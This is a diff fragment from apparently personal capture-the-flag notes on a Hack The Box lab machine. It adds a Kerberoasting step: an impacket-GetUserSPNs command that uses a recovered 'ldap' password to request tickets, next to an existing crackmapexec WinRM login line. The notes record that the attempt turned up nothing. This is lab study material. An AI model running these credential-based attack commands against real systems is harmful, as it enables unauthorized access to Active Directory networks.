@@ -187,3 +187,11 @@ crackmapexec winrm 10.10.11.174 -u 'ldap' -p 'nvEfEK16^1aM4$e7AclUf8x$tRWxPWO1%l
 >[!example]- Result
 >![[Pasted image 20250225141743.png]]
 
+### Request TGT / TGS
+- we can try to get a ticket but nothing
+```bash
+impacket-GetUserSPNs support.htb/ldap:'nvEfEK16^1aM4$e7AclUf8x$tRWxPWO1%lmz' -request
+```
+>[!example]- Request
+>![[Pasted image 20250225145454.png]]
+
